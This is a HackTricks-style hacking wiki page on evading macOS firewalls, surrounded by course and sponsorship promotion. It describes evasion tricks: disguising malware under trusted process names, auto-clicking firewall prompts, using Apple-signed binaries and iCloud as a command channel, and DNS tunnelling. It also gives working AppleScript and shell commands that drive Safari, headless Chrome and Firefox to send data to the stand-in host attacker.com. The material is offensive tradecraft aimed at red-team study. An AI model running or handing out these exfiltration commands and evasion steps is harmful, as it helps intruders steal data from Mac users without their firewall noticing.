# macOS Bypassing Firewalls

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Found techniques

The following techniques were found working in some macOS firewall apps.

### Abusing whitelist names

* For example calling the malware with names of well known macOS processes like **`launchd`**&#x20;

### Synthetic Click

* If the firewall ask for permission to the user make the malware **click on allow**

### **Use Apple signed binaries**

* Like **`curl`**, but also others like **`whois`**

### Well known apple domains

The firewall could be allowing connections to well known apple domains such as **`apple.com`** or **`icloud.com`**. And iCloud could be used as a C2.

### Generic Bypass

Some ideas to try to bypass firewalls

### Check allowed traffic

Knowing the allowed traffic will help you identify potentially whitelisted domains or which applications are allowed to access them

```bash
lsof -i TCP -sTCP:ESTABLISHED
```

### Abusing DNS

DNS resolutions are done via **`mdnsreponder`** signed application which will probably vi allowed to contact DNS servers.

<figure><img src="../../.gitbook/assets/image (1) (1) (6).png" alt=""><figcaption></figcaption></figure>

### Via Browser apps

* **oascript**

```applescript
tell application "Safari"
    run
    tell application "Finder" to set visible of process "Safari" to false
    make new document
    set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```

* Google Chrome

{% code overflow="wrap" %}
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
{% endcode %}

* Firefox

```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```

* Safari

```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```

### Via processes injections

If you can **inject code into a process** that is allowed to connect to any server you could bypass the firewall protections:

{% content-ref url="macos-proces-abuse/" %}
[macos-proces-abuse](macos-proces-abuse/)
{% endcontent-ref %}

## References

* [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
